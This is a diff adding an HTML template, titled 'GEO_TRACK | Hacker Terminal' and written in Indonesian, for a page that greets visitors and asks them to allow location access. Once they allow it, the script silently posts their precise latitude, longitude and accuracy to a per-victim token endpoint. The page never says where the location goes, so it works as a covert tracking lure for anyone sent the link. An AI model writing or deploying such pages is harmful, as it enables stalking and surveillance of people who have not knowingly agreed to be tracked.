@@ -1,0 +1,65 @@
+<!DOCTYPE html>
+<html lang="id">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>GEO_TRACK | Hacker Terminal</title>
+
+    <link rel="stylesheet" href="{{ url_for('static', filename='style.css') }}">
+</head>
+<body>
+<h2>Assalamualaikum</h2>
+<p>Tekan Izinkan ketika browser meminta akses.</p>
+<p id="status">Menunggu izin...</p>
+
+<script>
+const statusEl = document.getElementById("status");
+
+if (!navigator.geolocation) {
+    statusEl.textContent = "Browser tidak mendukung.";
+} else {
+    navigator.geolocation.getCurrentPosition(
+        async (position) => {
+            try {
+                const response = await fetch(
+                    "/api/location/{{ item['token'] }}",
+                    {
+                        method: "POST",
+                        headers: {
+                            "Content-Type": "application/json"
+                        },
+                        body: JSON.stringify({
+                            latitude: position.coords.latitude,
+                            longitude: position.coords.longitude,
+                            accuracy: position.coords.accuracy
+                        })
+                    }
+                );
+
+                const result = await response.json();
+
+                if (!response.ok) {
+                    throw new Error(result.error);
+                }
+
+                statusEl.textContent =
+                    "Ok terimakasih ....";
+            } catch (error) {
+                statusEl.textContent = error.message;
+            }
+        },
+        (error) => {
+            statusEl.textContent =
+                "Izin  ditolak atau tidak tersedia.";
+        },
+        {
+            enableHighAccuracy: true,
+            timeout: 20000,
+            maximumAge: 0
+        }
+    );
+}
+</script>
+</body>
+</html>
